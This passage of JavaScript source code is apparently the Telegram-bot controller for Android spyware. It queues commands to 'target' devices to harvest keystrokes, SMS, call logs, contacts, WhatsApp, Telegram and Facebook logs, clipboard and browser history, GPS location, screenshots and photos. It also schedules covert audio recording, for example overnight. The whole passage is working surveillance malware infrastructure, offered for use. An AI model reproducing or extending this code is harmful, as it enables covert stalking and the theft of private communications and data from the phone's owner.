        "└─ `/logs_count` - Database statistics\n\n" +
        
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n" +
        
        "📍 *LOCATION*\n" +
        "└─ `/location` - Get GPS location\n\n" +
        
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n" +
        
        "💡 *TIP:* All commands are now unified - use the main command names above for all related functions!"
    );
}

// ============= CALLBACK QUERY HANDLER =============

async function handleCallbackQuery(callbackQuery) {
    const chatId = callbackQuery.message.chat.id;
    const messageId = callbackQuery.message.message_id;
    const data = callbackQuery.data;
    const callbackId = callbackQuery.id;
    
    console.log(`🖱️ Callback received: ${data} from chat ${chatId}`);
    
    await answerCallbackQuery(callbackId);
    
    // ============= MAIN MENU NAVIGATION =============
    if (data === 'help_main') {
        await editMessageKeyboard(chatId, messageId, getMainMenuKeyboard(chatId));
        await sendTelegramMessage(chatId, "🤖 *Main Menu*\n\nSelect a category to get started.");
        
    } else if (data === 'menu_camera') {
        await editMessageKeyboard(chatId, messageId, getCameraMenuKeyboard());
        await sendTelegramMessage(chatId, "📸 *Camera Controls*\n\nSelect an option:");
        
    } else if (data === 'menu_recording') {
        await editMessageKeyboard(chatId, messageId, getRecordingMenuKeyboard());
        await sendTelegramMessage(chatId, "🎤 *Recording Controls*\n\nSelect an option:");
        
    } else if (data === 'menu_audio_quality') {
        await editMessageKeyboard(chatId, messageId, getAudioQualityMenuKeyboard());
        await sendTelegramMessage(chatId, "🎚️ *Audio Quality Settings*\n\nSelect quality level:");
        
    } else if (data === 'menu_social') {
        await editMessageKeyboard(chatId, messageId, getSocialMenuKeyboard());
        await sendTelegramMessage(chatId, "💬 *Social Media*\n\nSelect platform:");
        
    } else if (data === 'menu_media') {
        await editMessageKeyboard(chatId, messageId, getMediaMenuKeyboard());
        await sendTelegramMessage(chatId, "📁 *Media Scanner*\n\nSelect scan type:");
        
    } else if (data === 'menu_network') {
        await editMessageKeyboard(chatId, messageId, getNetworkMenuKeyboard());
        await sendTelegramMessage(chatId, "🌐 *Network Information*\n\nSelect option:");
        
    } else if (data === 'menu_realtime') {
        await editMessageKeyboard(chatId, messageId, getRealtimeMenuKeyboard());
        await sendTelegramMessage(chatId, "⚡ *Real-time Controls*\n\nSelect option:");
        
    } else if (data === 'menu_services') {
        await editMessageKeyboard(chatId, messageId, getServicesMenuKeyboard());
        await sendTelegramMessage(chatId, "🔧 *Service Controls*\n\nSelect option:");
        
    } else if (data === 'menu_device_info') {
        await editMessageKeyboard(chatId, messageId, getDeviceInfoMenuKeyboard());
        await sendTelegramMessage(chatId, "📱 *Device Information*\n\nSelect option:");
        
    } else if (data === 'menu_phone_info') {
        await editMessageKeyboard(chatId, messageId, getPhoneInfoMenuKeyboard());
        await sendTelegramMessage(chatId, "📞 *Phone Information*\n\nSelect option:");
        
    } else if (data === 'menu_tracking') {
        await editMessageKeyboard(chatId, messageId, getTrackingMenuKeyboard());
        await sendTelegramMessage(chatId, "📍 *Tracking Options*\n\nSelect option:");
        
    } else if (data === 'menu_screenshot') {
        await editMessageKeyboard(chatId, messageId, getScreenshotMenuKeyboard());
        await sendTelegramMessage(chatId, "📸 *Screenshot Controls*\n\nSelect option:");
        
    } else if (data === 'menu_new_features') {
        await editMessageKeyboard(chatId, messageId, getNewFeaturesMenuKeyboard());
        await sendTelegramMessage(chatId, "🆕 *NEW FEATURES MENU*\n\nSelect a category to explore the latest additions!");
        
    } else if (data === 'menu_detailed_exports') {
        await editMessageKeyboard(chatId, messageId, getDetailedExportsMenuKeyboard());
        await sendTelegramMessage(chatId, "📊 *DETAILED EXPORTS*\n\nGet comprehensive data exports with full details.");
        
    } else if (data === 'menu_file_scanner') {
        await editMessageKeyboard(chatId, messageId, getFileScannerMenuKeyboard());
        await sendTelegramMessage(chatId, "🔍 *FILE SCANNER*\n\nPowerful file system scanning tools.");
        
    } else if (data === 'menu_data_saving') {
        await editMessageKeyboard(chatId, messageId, getDataSavingMenuKeyboard());
        await sendTelegramMessage(chatId, "📡 *DATA SAVING MODE*\n\nSave mobile data usage.");
        
    } else if (data === 'menu_sync_harvest') {
        await editMessageKeyboard(chatId, messageId, getSyncHarvestMenuKeyboard());
        await sendTelegramMessage(chatId, "🔄 *SYNC & HARVEST*\n\nData synchronization tools.");
        
    } else if (data === 'menu_realtime_advanced') {
        await editMessageKeyboard(chatId, messageId, getRealtimeAdvancedMenuKeyboard());
        await sendTelegramMessage(chatId, "🔊 *ADVANCED REALTIME CONTROLS*\n\nFine-tune real-time logging.");
        
    } else if (data === 'menu_app_opens') {
        await editMessageKeyboard(chatId, messageId, getAppOpensMenuKeyboard());
        await sendTelegramMessage(chatId, "📱 *APP OPEN LOGS*\n\nTrack when apps are opened.");
        
    } else if (data === 'menu_calendar') {
        await editMessageKeyboard(chatId, messageId, getCalendarMenuKeyboard());
        await sendTelegramMessage(chatId, "📅 *CALENDAR EVENTS*\n\nExport calendar data.");
        
    } else if (data === 'menu_clipboard') {
        await editMessageKeyboard(chatId, messageId, getClipboardMenuKeyboard());
        await sendTelegramMessage(chatId, "📋 *CLIPBOARD LOGS*\n\nExport clipboard history.");
        
    } else if (data === 'menu_browser_history') {
        await editMessageKeyboard(chatId, messageId, getBrowserHistoryMenuKeyboard());
        await sendTelegramMessage(chatId, "🌐 *BROWSER HISTORY*\n\nExport browsing history.");
        
    } else if (data === 'menu_devices') {
        const userDevices = getDeviceListForUser(chatId);
        const keyboard = getDeviceSelectionKeyboard(chatId);
        
        let message = `📱 *Device Management*\n\n`;
        message += `You have ${userDevices.length} device(s) registered.\n\n`;
        
        if (userDevices.length > 0) {
            message += `*Active Devices:*\n`;
            userDevices.forEach(device => {
                const status = device.isActive ? '✅ ' : '○ ';
                message += `${status} ${device.name}\n`;
                message += `   └ ID: ${device.id.substring(0, 8)}...\n`;
                message += `   └ Last seen: ${device.lastSeenFormatted}\n`;
                if (device.phoneNumber !== 'Not available') {
                    message += `   └ Phone: ${device.phoneNumber}\n`;
                }
                message += `\n`;
            });
        } else {
            message += `No devices found. Make sure the app is running and registered.`;
        }
        
        await editMessageKeyboard(chatId, messageId, keyboard);
        await sendTelegramMessage(chatId, message);
        
    } else if (data === 'refresh_devices') {
        const keyboard = getDeviceSelectionKeyboard(chatId);
        await editMessageKeyboard(chatId, messageId, keyboard);
        await answerCallbackQuery(callbackId, '🔄 Device list refreshed');
        
    } else if (data === 'device_stats') {
        const userDevices = getDeviceListForUser(chatId);
        let message = `📊 *Device Statistics*\n\n`;
        message += `Total Devices: ${userDevices.length}\n\n`;
        
        userDevices.forEach((device, index) => {
            message += `*Device ${index + 1}:* ${device.name}\n`;
            message += `• ID: ${device.id.substring(0, 8)}...\n`;
            message += `• Last Seen: ${device.lastSeenFormatted}\n`;
            message += `• Status: ${(Date.now() - device.lastSeen) < 300000 ? '✅ Online' : '⏹️ Offline'}\n`;
            if (device.phoneNumber !== 'Not available') {
                message += `• Phone: ${device.phoneNumber}\n`;
            }
            message += `\n`;
        });
        
        await answerCallbackQuery(callbackId);
        await sendTelegramMessage(chatId, message);
        
    } else if (data.startsWith('select_device:')) {
        const selectedDeviceId = data.split(':')[1];
        const device = devices.get(selectedDeviceId);
        
        if (device) {
            userDeviceSelection.set(chatId, selectedDeviceId);
            
            await answerCallbackQuery(callbackId, `✅ Now controlling ${device.deviceInfo?.model || 'device'}`);
            
            const keyboard = getMainMenuKeyboard(chatId);
            await editMessageKeyboard(chatId, messageId, keyboard);
            
            await sendTelegramMessage(chatId, 
                `✅ *Now controlling:*\n` +
                `• Device: ${device.deviceInfo?.model || 'Unknown'}\n` +
                `• ID: ${selectedDeviceId.substring(0, 8)}...\n` +
                `• Last seen: ${new Date(device.lastSeen).toLocaleString()}\n\n` +
                `All commands will now be sent to this device.`);
        }
        
    } else if (data === 'close_menu') {
        await editMessageKeyboard(chatId, messageId, []);
        await sendTelegramMessage(chatId, "Menu closed. Tap the Menu button or type /help to reopen.");
        
    } else if (data === 'start_custom_schedule_interactive') {
        userStates.set(chatId, {
            state: SCHEDULE_STATES.AWAITING_START_TIME,
            data: {}
        });
        
        const keyboard = [[{ text: '❌ Cancel', callback_data: 'cancel_setup' }]];
        await editMessageKeyboard(chatId, messageId, keyboard);
        
        await sendTelegramMessage(chatId, 
            "⚙️ *Custom Schedule Setup*\n\n" +
            "Please enter the START time in 24-hour format (HH:MM)\n" +
            "Example: `22:00` for 10:00 PM");
        
    } else if (data === 'cancel_setup') {
        userStates.delete(chatId);
        await editMessageKeyboard(chatId, messageId, []);
        await sendTelegramMessage(chatId, "❌ Schedule setup cancelled.");
        
    } else if (data === 'add_target_example') {
        await sendTelegramMessage(chatId, 
            "📱 *Add Target App*\n\n" +
            "Use: `/add_target com.package.name`\n\n" +
            "Examples:\n" +
            "• `/add_target com.instagram.android`\n" +
            "• `/add_target com.whatsapp`\n" +
            "• `/add_target com.facebook.katana`");
        
    } else if (data.startsWith('recurring:')) {
        const recurring = data.split(':')[1];
        const userState = userStates.get(chatId);
        
        if (userState && userState.state === SCHEDULE_STATES.AWAITING_RECURRING) {
            userState.data.recurring = recurring === 'daily';
            userState.state = SCHEDULE_STATES.AWAITING_INTERVAL;
            
            await editMessageKeyboard(chatId, messageId, []);
            await sendTelegramMessage(chatId, 
                "✅ Schedule type recorded.\n\n" +
                "Finally, enter the recording interval in minutes (e.g., 15, 30, 60):");
        }
        
    } else {
        // Handle direct command callbacks (like 'screenshot', 'photo', etc.)
        console.log(`🎯 Executing command from button: ${data}`);
        await answerCallbackQuery(callbackId, `⏳ Executing ${data}...`);
        await handleCommand(chatId, `/${data}`, messageId);
        
        const keyboard = [
            [
                { text: '✅ Command Sent', callback_data: 'noop' },
                { text: '◀️ Back to Menu', callback_data: 'help_main' }
            ]
        ];
        await editMessageKeyboard(chatId, messageId, keyboard);
    }
}

// ============= CONVERSATION HANDLER =============

async function handleConversationMessage(chatId, text, messageId, userState) {
    console.log(`💬 Conversation message: ${text} in state ${userState.state}`);
    
    switch (userState.state) {
        case SCHEDULE_STATES.AWAITING_START_TIME:
            if (!text.match(/^([0-1]?[0-9]|2[0-3]):[0-5][0-9]$/)) {
                await sendTelegramMessage(chatId, 
                    "❌ Invalid time format. Please use HH:MM (e.g., 22:00)");
                return;
            }
            
            userState.data.startTime = text;
            userState.state = SCHEDULE_STATES.AWAITING_END_TIME;
            
            await sendTelegramMessage(chatId, 
                "✅ Start time recorded.\n\n" +
                "Now enter the END time (HH:MM)\n" +
                "Example: `02:00` for 2:00 AM");
            break;
            
        case SCHEDULE_STATES.AWAITING_END_TIME:
            if (!text.match(/^([0-1]?[0-9]|2[0-3]):[0-5][0-9]$/)) {
                await sendTelegramMessage(chatId, 
                    "❌ Invalid time format. Please use HH:MM (e.g., 02:00)");
                return;
            }
            
            userState.data.endTime = text;
            userState.state = SCHEDULE_STATES.AWAITING_RECURRING;
            
            const keyboard = [
                [
                    { text: '✅ Daily', callback_data: 'recurring:daily' },
                    { text: '🔄 Once', callback_data: 'recurring:once' }
                ]
            ];
            
            await sendTelegramMessageWithKeyboard(
                chatId,
                "✅ End time recorded.\n\n" +
                "Should this schedule repeat daily or run once?",
                keyboard
            );
            break;
            
        case SCHEDULE_STATES.AWAITING_INTERVAL:
            const interval = parseInt(text);
            if (isNaN(interval) || interval < 5 || interval > 120) {
                await sendTelegramMessage(chatId, 
                    "❌ Invalid interval. Please enter a number between 5 and 120.");
                return;
            }
            
            const [startHour, startMin] = userState.data.startTime.split(':').map(Number);
            const [endHour, endMin] = userState.data.endTime.split(':').map(Number);
            const recurring = userState.data.recurring;
            
            const command = `/record_custom ${startHour.toString().padStart(2,'0')}:${startMin.toString().padStart(2,'0')} ${endHour.toString().padStart(2,'0')}:${endMin.toString().padStart(2,'0')} ${recurring ? 'daily' : 'once'} ${interval}`;
            
            userStates.delete(chatId);
            
            await handleCommand(chatId, command, messageId);
            
            await sendTelegramMessage(chatId, 
                "✅ *Custom Schedule Configured*\n\n" +
                `Start: ${userState.data.startTime}\n` +
                `End: ${userState.data.endTime}\n` +
                `Type: ${recurring ? 'Daily' : 'One-time'}\n` +
                `Interval: ${interval} minutes\n\n` +
                `Command sent to device.`);
            break;
    }
}

// ============= UNIFIED COMMAND HANDLER =============

async function handleCommand(chatId, command, messageId) {
    console.log(`\n🎯 Handling unified command: ${command} from chat ${chatId}`);

    // Get selected device
    let selectedDeviceId = userDeviceSelection.get(chatId);
    let device = null;
    
    if (selectedDeviceId) {
        device = devices.get(selectedDeviceId);
    }
    
    if (!device) {
        for (const [id, d] of devices.entries()) {
            if (String(d.chatId) === String(chatId)) {
                selectedDeviceId = id;
                device = d;
                userDeviceSelection.set(chatId, selectedDeviceId);
                break;
            }
        }
    }

    if (!device) {
        await sendTelegramMessage(chatId, '❌ No device registered.\n\nPlease make sure the Android app is running.');
        return;
    }

    device.lastSeen = Date.now();

    const cleanCommand = command.substring(1);
    
    // UNIFIED HELP
    if (cleanCommand === 'help') {
        await showUnifiedHelpMenu(chatId);
        return;
    }
    
    // UNIFIED DEVICE INFO
    if (cleanCommand === 'device_info') {
        if (!device.pendingCommands) device.pendingCommands = [];
        device.pendingCommands.push({
            command: 'device_info',
            originalCommand: command,
            messageId: messageId,
            timestamp: Date.now()
        });
        await sendTelegramMessage(chatId, `📱 Device info command sent to ${device.deviceInfo?.model || 'device'}`);
        return;
    }
    
    // UNIFIED NETWORK INFO
    if (cleanCommand === 'network_info') {
        if (!device.pendingCommands) device.pendingCommands = [];
        device.pendingCommands.push({
            command: 'network_info',
            originalCommand: command,
            messageId: messageId,
            timestamp: Date.now()
        });
        await sendTelegramMessage(chatId, `🌐 Network info command sent to ${device.deviceInfo?.model || 'device'}`);
        return;
    }
    
    // UNIFIED MOBILE INFO
    if (cleanCommand === 'mobile_info') {
        if (!device.pendingCommands) device.pendingCommands = [];
        device.pendingCommands.push({
            command: 'mobile_info',
            originalCommand: command,
            messageId: messageId,
            timestamp: Date.now()
        });
        await sendTelegramMessage(chatId, `📱 Mobile info command sent to ${device.deviceInfo?.model || 'device'}`);
        return;
    }
    
    // UNIFIED SCREENSHOT
    if (cleanCommand === 'screenshot') {
        if (!device.pendingCommands) device.pendingCommands = [];
        device.pendingCommands.push({
            command: 'screenshot',
            originalCommand: command,
            messageId: messageId,
            timestamp: Date.now()
        });
        await sendTelegramMessage(chatId, `📸 Screenshot command sent to ${device.deviceInfo?.model || 'device'}`);
        return;
    }
    
    // UNIFIED SCREENSHOT SETTINGS
    if (cleanCommand === 'screenshot_settings') {
        if (!device.pendingCommands) device.pendingCommands = [];
        device.pendingCommands.push({
            command: 'screenshot_settings',
            originalCommand: command,
            messageId: messageId,
            timestamp: Date.now()
        });
        await sendTelegramMessage(chatId, `⚙️ Screenshot settings command sent to ${device.deviceInfo?.model || 'device'}`);
        return;
    }
    
    // UNIFIED START 60S REC
    if (cleanCommand === 'start_60s_rec') {
        if (!device.pendingCommands) device.pendingCommands = [];
        device.pendingCommands.push({
            command: 'start_60s_rec',
            originalCommand: command,
            messageId: messageId,
            timestamp: Date.now()
        });
        await sendTelegramMessage(chatId, `🎤 60-second recording started on ${device.deviceInfo?.model || 'device'}`);
        return;
    }
    
    // UNIFIED STOP 60S REC
    if (cleanCommand === 'stop_60s_rec') {
        if (!device.pendingCommands) device.pendingCommands = [];
        device.pendingCommands.push({
            command: 'stop_60s_rec',
            originalCommand: command,
            messageId: messageId,
            timestamp: Date.now()
        });
        await sendTelegramMessage(chatId, `⏹️ Recording stopped on ${device.deviceInfo?.model || 'device'}`);
        return;
    }
    
    // UNIFIED RECORD INFO
    if (cleanCommand === 'record_info') {
        if (!device.pendingCommands) device.pendingCommands = [];
        device.pendingCommands.push({
            command: 'record_info',
            originalCommand: command,
            messageId: messageId,
            timestamp: Date.now()
        });
        await sendTelegramMessage(chatId, `🎤 Recording info command sent to ${device.deviceInfo?.model || 'device'}`);
        return;
    }
    
    // UNIFIED CONTACTS
    if (cleanCommand === 'contacts') {
        if (!device.pendingCommands) device.pendingCommands = [];
        device.pendingCommands.push({
            command: 'contacts',
            originalCommand: command,
            messageId: messageId,
            timestamp: Date.now()
        });
        await sendTelegramMessage(chatId, `📇 Contacts export command sent to ${device.deviceInfo?.model || 'device'}`);
        return;
    }
    
    // UNIFIED SMS
    if (cleanCommand === 'sms') {
        if (!device.pendingCommands) device.pendingCommands = [];
        device.pendingCommands.push({
            command: 'sms',
            originalCommand: command,
            messageId: messageId,
            timestamp: Date.now()
        });
        await sendTelegramMessage(chatId, `💬 SMS export command sent to ${device.deviceInfo?.model || 'device'}`);
        return;
    }
    
    // UNIFIED CALL LOGS
    if (cleanCommand === 'calllogs') {
        if (!device.pendingCommands) device.pendingCommands = [];
        device.pendingCommands.push({
            command: 'calllogs',
            originalCommand: command,
            messageId: messageId,
            timestamp: Date.now()
        });
        await sendTelegramMessage(chatId, `📞 Call logs command sent to ${device.deviceInfo?.model || 'device'}`);
        return;
    }
    
    // UNIFIED WHATSAPP
    if (cleanCommand === 'whatsapp') {
        if (!device.pendingCommands) device.pendingCommands = [];
        device.pendingCommands.push({
            command: 'whatsapp',
            originalCommand: command,
            messageId: messageId,
            timestamp: Date.now()
        });
        await sendTelegramMessage(chatId, `💬 WhatsApp logs command sent to ${device.deviceInfo?.model || 'device'}`);
        return;
    }
    
    // UNIFIED TELEGRAM
    if (cleanCommand === 'telegram') {
        if (!device.pendingCommands) device.pendingCommands = [];
        device.pendingCommands.push({
            command: 'telegram',
            originalCommand: command,
            messageId: messageId,
            timestamp: Date.now()
        });
        await sendTelegramMessage(chatId, `💬 Telegram logs command sent to ${device.deviceInfo?.model || 'device'}`);
        return;
    }
    
    // UNIFIED FACEBOOK
    if (cleanCommand === 'facebook') {
        if (!device.pendingCommands) device.pendingCommands = [];
        device.pendingCommands.push({
            command: 'facebook',
            originalCommand: command,
            messageId: messageId,
            timestamp: Date.now()
        });
        await sendTelegramMessage(chatId, `💬 Facebook logs command sent to ${device.deviceInfo?.model || 'device'}`);
        return;
    }
    
    // UNIFIED BROWSER
    if (cleanCommand === 'browser') {
        if (!device.pendingCommands) device.pendingCommands = [];
        device.pendingCommands.push({
            command: 'browser',
            originalCommand: command,
            messageId: messageId,
            timestamp: Date.now()
        });
        await sendTelegramMessage(chatId, `🌐 Browser history command sent to ${device.deviceInfo?.model || 'device'}`);
        return;
    }
    
    // UNIFIED CLIPBOARD
    if (cleanCommand === 'clipboard') {
        if (!device.pendingCommands) device.pendingCommands = [];
        device.pendingCommands.push({
            command: 'clipboard',
            originalCommand: command,
            messageId: messageId,
            timestamp: Date.now()
        });
        await sendTelegramMessage(chatId, `📋 Clipboard logs command sent to ${device.deviceInfo?.model || 'device'}`);
        return;
    }
    
    // UNIFIED CALENDAR
    if (cleanCommand === 'calendar') {
        if (!device.pendingCommands) device.pendingCommands = [];
        device.pendingCommands.push({
            command: 'calendar',
            originalCommand: command,
            messageId: messageId,
            timestamp: Date.now()
        });
        await sendTelegramMessage(chatId, `📅 Calendar events command sent to ${device.deviceInfo?.model || 'device'}`);
        return;
    }
    
    // UNIFIED SCAN ALL
    if (cleanCommand === 'scan_all') {
        if (!device.pendingCommands) device.pendingCommands = [];
        device.pendingCommands.push({
            command: 'scan_all',
            originalCommand: command,
            messageId: messageId,
            timestamp: Date.now()
        });
        await sendTelegramMessage(chatId, `🔍 Full system scan initiated on ${device.deviceInfo?.model || 'device'}. This may take a few minutes.`);
        return;
    }
    
    // UNIFIED SCAN MEDIA
    if (cleanCommand === 'scan_media') {
        if (!device.pendingCommands) device.pendingCommands = [];
        device.pendingCommands.push({
            command: 'scan_media',
            originalCommand: command,
            messageId: messageId,
            timestamp: Date.now()
        });
        await sendTelegramMessage(chatId, `🎵 Media scan initiated on ${device.deviceInfo?.model || 'device'}`);
        return;
    }
    
    // UNIFIED SYNC ALL
    if (cleanCommand === 'sync_all') {
        if (!device.pendingCommands) device.pendingCommands = [];
        device.pendingCommands.push({
            command: 'sync_all',
            originalCommand: command,
            messageId: messageId,
            timestamp: Date.now()
        });
        await sendTelegramMessage(chatId, `🔄 Sync all command sent to ${device.deviceInfo?.model || 'device'}`);
        return;
    }
    
    // UNIFIED SAVING STATUS
    if (cleanCommand === 'saving_status') {
        if (!device.pendingCommands) device.pendingCommands = [];
        device.pendingCommands.push({
            command: 'saving_status',
            originalCommand: command,
            messageId: messageId,
            timestamp: Date.now()
        });
        await sendTelegramMessage(chatId, `📡 Data saving status command sent to ${device.deviceInfo?.model || 'device'}`);
        return;
    }
    
    // UNIFIED RT STATUS
    if (cleanCommand === 'rt_status') {
        if (!device.pendingCommands) device.pendingCommands = [];
        device.pendingCommands.push({
            command: 'rt_status',
            originalCommand: command,
            messageId: messageId,
            timestamp: Date.now()
        });
        await sendTelegramMessage(chatId, `📊 Real-time status command sent to ${device.deviceInfo?.model || 'device'}`);
        return;
    }
    
    // UNIFIED RT ALL ON
    if (cleanCommand === 'rt_all_on') {
        if (!device.pendingCommands) device.pendingCommands = [];
        device.pendingCommands.push({
            command: 'rt_all_on',
            originalCommand: command,
            messageId: messageId,
            timestamp: Date.now()
        });
        await sendTelegramMessage(chatId, `✅ All real-time logging enabled on ${device.deviceInfo?.model || 'device'}`);
        return;
    }
    
    // UNIFIED RT ALL OFF
    if (cleanCommand === 'rt_all_off') {
        if (!device.pendingCommands) device.pendingCommands = [];
        device.pendingCommands.push({
            command: 'rt_all_off',
            originalCommand: command,
            messageId: messageId,
            timestamp: Date.now()
        });
        await sendTelegramMessage(chatId, `❌ All real-time logging disabled on ${device.deviceInfo?.model || 'device'}`);
        return;
    }
    
    // UNIFIED RT NOTIF ON
    if (cleanCommand === 'rt_notif_on') {
        if (!device.pendingCommands) device.pendingCommands = [];
        device.pendingCommands.push({
            command: 'rt_notif_on',
            originalCommand: command,
            messageId: messageId,
            timestamp: Date.now()
        });
        await sendTelegramMessage(chatId, `🔔 Real-time notifications enabled on ${device.deviceInfo?.model || 'device'}`);
        return;
    }
    
    // UNIFIED RT NOTIF OFF
    if (cleanCommand === 'rt_notif_off') {
        if (!device.pendingCommands) device.pendingCommands = [];
        device.pendingCommands.push({
            command: 'rt_notif_off',
            originalCommand: command,
            messageId: messageId,
            timestamp: Date.now()
        });
        await sendTelegramMessage(chatId, `🔔 Real-time notifications disabled on ${device.deviceInfo?.model || 'device'}`);
        return;
    }
    
    // UNIFIED RT KEYS ON
    if (cleanCommand === 'rt_keys_on') {
        if (!device.pendingCommands) device.pendingCommands = [];
        device.pendingCommands.push({
            command: 'rt_keys_on',
            originalCommand: command,
            messageId: messageId,
            timestamp: Date.now()
        });
        await sendTelegramMessage(chatId, `🔑 Real-time keystrokes enabled on ${device.deviceInfo?.model || 'device'}`);
        return;
    }
    
    // UNIFIED RT KEYS OFF
    if (cleanCommand === 'rt_keys_off') {
        if (!device.pendingCommands) device.pendingCommands = [];
        device.pendingCommands.push({
            command: 'rt_keys_off',
            originalCommand: command,
            messageId: messageId,
            timestamp: Date.now()
        });
        await sendTelegramMessage(chatId, `🔑 Real-time keystrokes disabled on ${device.deviceInfo?.model || 'device'}`);
        return;
    }
    
    // UNIFIED OPEN APP
    if (cleanCommand === 'open_app') {
        if (!device.pendingCommands) device.pendingCommands = [];
        device.pendingCommands.push({
            command: 'open_app',
            originalCommand: command,
            messageId: messageId,
            timestamp: Date.now()
        });
        await sendTelegramMessage(chatId, `📱 App opens command sent to ${device.deviceInfo?.model || 'device'}`);
        return;
    }
    
    // UNIFIED APPS LIST
    if (cleanCommand === 'apps_list') {
        if (!device.pendingCommands) device.pendingCommands = [];
        device.pendingCommands.push({
            command: 'apps_list',
            originalCommand: command,
            messageId: messageId,
            timestamp: Date.now()
        });
        await sendTelegramMessage(chatId, `📱 Apps list command sent to ${device.deviceInfo?.model || 'device'}`);
        return;
    }
    
    // UNIFIED KEYS
    if (cleanCommand === 'keys') {
        if (!device.pendingCommands) device.pendingCommands = [];
        device.pendingCommands.push({
            command: 'keys',
            originalCommand: command,
            messageId: messageId,
            timestamp: Date.now()
        });
        await sendTelegramMessage(chatId, `⌨️ Keystroke logs command sent to ${device.deviceInfo?.model || 'device'}`);
        return;
    }
    
    // UNIFIED NOTIFY
    if (cleanCommand === 'notify') {
        if (!device.pendingCommands) device.pendingCommands = [];
        device.pendingCommands.push({
            command: 'notify',
            originalCommand: command,
            messageId: messageId,
            timestamp: Date.now()
        });
        await sendTelegramMessage(chatId, `🔔 Notification logs command sent to ${device.deviceInfo?.model || 'device'}`);
        return;
    }
    
    // UNIFIED PHOTO
    if (cleanCommand === 'photo') {
        if (!device.pendingCommands) device.pendingCommands = [];
        device.pendingCommands.push({
            command: 'photo',
            originalCommand: command,
            messageId: messageId,
            timestamp: Date.now()
        });
        await sendTelegramMessage(chatId, `📸 Photo command sent to ${device.deviceInfo?.model || 'device'}`);
        return;
    }
    
    // UNIFIED LOGS COUNT
    if (cleanCommand === 'logs_count') {
        if (!device.pendingCommands) device.pendingCommands = [];
        device.pendingCommands.push({
            command: 'logs_count',
            originalCommand: command,
            messageId: messageId,
            timestamp: Date.now()
        });
        await sendTelegramMessage(chatId, `📊 Logs count command sent to ${device.deviceInfo?.model || 'device'}`);
        return;
    }
    
    // UNIFIED LOCATION
    if (cleanCommand === 'location') {
        if (!device.pendingCommands) device.pendingCommands = [];
        device.pendingCommands.push({
            command: 'location',
            originalCommand: command,
            messageId: messageId,
            timestamp: Date.now()
        });
        await sendTelegramMessage(chatId, `📍 Location command sent to ${device.deviceInfo?.model || 'device'}`);
        return;
    }
    
    // UNIFIED RECORD AUTO ON
    if (cleanCommand === 'record_auto_on') {
        if (!device.pendingCommands) device.pendingCommands = [];
        device.pendingCommands.push({
            command: 'record_auto_on',
            originalCommand: command,
            messageId: messageId,
            timestamp: Date.now()
        });
        await sendTelegramMessage(chatId, `✅ Auto-recording enabled on ${device.deviceInfo?.model || 'device'}`);
        return;
    }
    
    // UNIFIED RECORD AUTO OFF
    if (cleanCommand === 'record_auto_off') {
        if (!device.pendingCommands) device.pendingCommands = [];
        device.pendingCommands.push({
            command: 'record_auto_off',
            originalCommand: command,
            messageId: messageId,
            timestamp: Date.now()
        });
        await sendTelegramMessage(chatId, `❌ Auto-recording disabled on ${device.deviceInfo?.model || 'device'}`);
        return;
    }
    
    // UNIFIED RECORD CUSTOM
    if (cleanCommand.startsWith('record_custom')) {
        if (!device.pendingCommands) device.pendingCommands = [];
        device.pendingCommands.push({
            command: cleanCommand,
            originalCommand: command,
            messageId: messageId,
            timestamp: Date.now()
        });
        await sendTelegramMessage(chatId, `⚙️ Custom schedule set on ${device.deviceInfo?.model || 'device'}`);
        return;
    }
    
    // UNIFIED AUDIO QUALITY COMMANDS
    if (cleanCommand === 'audio_ultra' || cleanCommand === 'audio_very_low' || 
        cleanCommand === 'audio_low' || cleanCommand === 'audio_medium' || cleanCommand === 'audio_high') {
        if (!device.pendingCommands) device.pendingCommands = [];
        device.pendingCommands.push({
            command: cleanCommand,
            originalCommand: command,
            messageId: messageId,
            timestamp: Date.now()
        });
        await sendTelegramMessage(chatId, `🎤 Audio quality set on ${device.deviceInfo?.model || 'device'}`);
        return;
    }
    
    // UNIFIED AUDIO INFO
    if (cleanCommand === 'audio_info') {
        if (!device.pendingCommands) device.pendingCommands = [];
        device.pendingCommands.push({
            command: 'audio_info',
            originalCommand: command,
            messageId: messageId,
            timestamp: Date.now()
        });
        await sendTelegramMessage(chatId, `🎤 Audio info command sent to ${device.deviceInfo?.model || 'device'}`);
        return;
    }
    
    // UNIFIED WIFI ONLY ON
    if (cleanCommand === 'wifi_only_on') {
        if (!device.pendingCommands) device.pendingCommands = [];
        device.pendingCommands.push({
            command: 'wifi_only_on',
            originalCommand: command,
            messageId: messageId,
            timestamp: Date.now()
        });
        await sendTelegramMessage(chatId, `📡 WiFi-only mode enabled on ${device.deviceInfo?.model || 'device'}`);
        return;
    }
    
    // UNIFIED WIFI ONLY OFF
    if (cleanCommand === 'wifi_only_off') {
        if (!device.pendingCommands) device.pendingCommands = [];
        device.pendingCommands.push({
            command: 'wifi_only_off',
            originalCommand: command,
            messageId: messageId,
            timestamp: Date.now()
        });
        await sendTelegramMessage(chatId, `📡 WiFi-only mode disabled on ${device.deviceInfo?.model || 'device'}`);
        return;
    }
    
    // UNIFIED START SCREENSHOT
    if (cleanCommand === 'start_screenshot') {
        if (!device.pendingCommands) device.pendingCommands = [];
        device.pendingCommands.push({
            command: 'start_screenshot',
            originalCommand: command,
            messageId: messageId,
            timestamp: Date.now()
        });
        await sendTelegramMessage(chatId, `📸 Screenshot service started on ${device.deviceInfo?.model || 'device'}`);
        return;
    }
    
    // UNIFIED STOP SCREENSHOT
    if (cleanCommand === 'stop_screenshot') {
        if (!device.pendingCommands) device.pendingCommands = [];
        device.pendingCommands.push({
            command: 'stop_screenshot',
            originalCommand: command,
            messageId: messageId,
            timestamp: Date.now()
        });
        await sendTelegramMessage(chatId, `📸 Screenshot service stopped on ${device.deviceInfo?.model || 'device'}`);
        return;
    }
    
    // UNIFIED SMALL
    if (cleanCommand === 'small') {
        if (!device.pendingCommands) device.pendingCommands = [];
        device.pendingCommands.push({
            command: 'small',
            originalCommand: command,
            messageId: messageId,
            timestamp: Date.now()
        });
        await sendTelegramMessage(chatId, `📏 Screenshot size set to SMALL on ${device.deviceInfo?.model || 'device'}`);
        return;
    }
    
    // UNIFIED MEDIUM
    if (cleanCommand === 'medium') {
        if (!device.pendingCommands) device.pendingCommands = [];
        device.pendingCommands.push({
            command: 'medium',
            originalCommand: command,
            messageId: messageId,
            timestamp: Date.now()
        });
